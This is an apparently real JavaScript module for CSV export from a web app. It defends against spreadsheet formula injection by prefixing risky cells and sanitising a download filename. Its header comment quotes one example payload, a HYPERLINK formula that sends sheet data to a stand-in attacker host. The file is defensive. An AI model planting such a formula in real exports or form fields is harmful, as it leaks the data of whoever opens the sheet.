/* RFC 4180 CSV, with the one extra rule spreadsheets make necessary.

   ⛔ FORMULA INJECTION. Excel, Numbers and Google Sheets treat a cell that starts
   with = + - @ (or a tab/CR before one) as a FORMULA, not text. So a "name" of
   =HYPERLINK("https://evil.example/"&A1,"click") in a public RSVP form becomes a
   live, clickable formula the moment an officer opens the export — reading the
   sheet's own data and sending it out. The row was stored correctly and escaped
   correctly for HTML; the spreadsheet is a different context with a different
   escape, which is exactly why this site escapes AT USE rather than sanitising at
   storage.

   The fix is a leading apostrophe, which every major spreadsheet reads as "this
   cell is text" and does not display. Prefixing is right here even though this
   file elsewhere prefers rejecting over repairing: the value was already accepted
   and stored, the officer needs to see what the person actually typed, and the
   apostrophe changes the rendering rather than the value. */

const RISKY = /^[=+\-@\t\r]/;

export function csvCell(value) {
  if (value === null || value === undefined) return '';
  let s = String(value);
  if (RISKY.test(s)) s = "'" + s;
  if (/[",\n\r]/.test(s)) s = '"' + s.replace(/"/g, '""') + '"';
  return s;
}

export function csvRows(header, rows) {
  const out = [header.map(csvCell).join(',')];
  for (const row of rows) out.push(row.map(csvCell).join(','));
  // CRLF per RFC 4180, and a trailing newline so the last row is terminated.
  return out.join('\r\n') + '\r\n';
}

/* A filename safe to put in a Content-Disposition header: no quotes, no CR/LF, no
   path separators. A header value assembled from a user-controlled event id is a
   response-splitting bug waiting to happen. */
export function csvResponse(filename, body) {
  const safe = String(filename).replace(/[^A-Za-z0-9._-]/g, '-').slice(0, 80) || 'export';
  return new Response(body, {
    status: 200,
    headers: {
      'content-type': 'text/csv; charset=utf-8',
      'content-disposition': `attachment; filename="${safe}.csv"`,
      'cache-control': 'no-store',
    },
  });
}
